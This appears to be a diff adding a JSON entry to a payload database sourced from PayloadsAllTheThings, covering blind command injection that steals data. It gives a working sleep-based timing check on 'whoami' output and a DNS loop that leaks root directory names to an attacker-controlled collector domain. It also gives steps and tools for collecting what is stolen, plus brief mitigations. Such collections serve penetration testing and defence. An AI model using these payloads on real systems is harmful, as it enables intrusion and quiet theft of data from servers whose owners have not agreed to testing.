@@ -1,0 +1,52 @@
+{
+  "id": "payload_000022",
+  "important": {
+    "title": "Command Injection - Data Exfiltration (Time & DNS)",
+    "category": "Web Vulnerabilities",
+    "sub_category": "Data Exfiltration",
+    "tags": ["exfiltration","dns","timing","oob","interactsh"],
+    "targets": { "os": ["Linux","Unix"], "system": ["Shell","Network"] },
+    "risk": "critical"
+  },
+  "variants": [
+    {
+      "match": { "os": ["Linux"], "system": ["Timing"] },
+      "payload": {
+        "explanation": "Exfiltrate data by inducing time delays and measuring response times char-by-char.",
+        "code": "if [ $(whoami | cut -c1) == s ]; then sleep 5; fi",
+        "run_context": "Blind injection where only timing differences can be observed.",
+        "placeholders": { "CHAR_POS": "1", "EXPECTED_CHAR": "s", "DELAY": "5" },
+        "notes": "Automate probing to reconstruct strings slowly."
+      }
+    },
+    {
+      "match": { "os": ["Linux"], "system": ["DNS OOB"] },
+      "payload": {
+        "explanation": "Exfiltrate filenames/content by resolving domain names to attacker-controlled DNS service.",
+        "code": "for i in $(ls /); do host \"$i.DNS_ID.example.com\"; done",
+        "run_context": "Server resolves hostnames out to DNS; attacker collects queries on their DNS server or interactsh.",
+        "placeholders": { "DNS_ID": "unique-id.dns-collector" },
+        "notes": "Use projectdiscovery/interactsh or dnsbin for collection."
+      }
+    }
+  ],
+  "usage": {
+    "steps": [
+      "For timing: iterate over characters/positions and use sleep-based checks to infer values.",
+      "For DNS: create attacker-controlled DNS listener and trigger host lookups containing exfil data.",
+      "Aggregate and reconstruct exfiltrated data from collected responses."
+    ],
+    "tools": ["projectdiscovery/interactsh","dnsbin","Burp Suite"],
+    "code_samples": [
+      { "title": "Timing check", "description": "Sleep when char matches", "code": "if [ $(whoami|cut -c1) == s ]; then sleep 5; fi", "run_context": "shell (blind)"},
+      { "title": "DNS exfil loop", "description": "Resolve filenames to attacker DNS", "code": "for i in $(ls /); do host \"$i.DNS_ID.example.com\"; done", "run_context": "shell (with network egress)" }
+    ],
+    "mitigations": [
+      "Block outbound arbitrary DNS or restrict egress.",
+      "Use network monitoring for unusual DNS queries.",
+      "Avoid passing unsanitized input to shells that can perform network ops."
+    ],
+    "references": ["projectdiscovery/interactsh"]
+  },
+  "system": { "version": "2.0.0", "source": "PayloadsAllTheThings" }
+}
